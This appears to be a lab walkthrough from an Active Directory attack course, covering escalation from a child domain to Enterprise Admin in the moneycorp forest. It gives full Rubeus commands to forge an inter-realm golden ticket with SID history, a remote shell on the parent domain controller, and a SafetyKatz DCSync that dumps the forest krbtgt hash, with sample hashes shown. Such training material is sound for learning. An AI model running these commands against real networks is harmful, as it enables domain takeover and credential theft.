# Learning Objetive 19

* Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admins using dollarcorp’s krbtgt hash.

***

We already have the krbtgt hash from dcorp-dc. Let’s create the inter-realm TGT and inject. Run the below command:

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt

[snip]

[+] Ticket successfully imported!
```

We can now access mcorp-dc!

```
C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

C:\Users\TEMP> set username
set username
USERNAME=Administrator

C:\Users\TEMP> set computername
set computername
COMPUTERNAME=MCORP-DC
```

Awesome!

We can also execute the DCSync attacks against moneycorp. Use the following command in the above prompt where we injected the ticket:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

[snip]

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361
```

> krbtgt:a0981492d5dfab1ae0b97b51ea895ddf
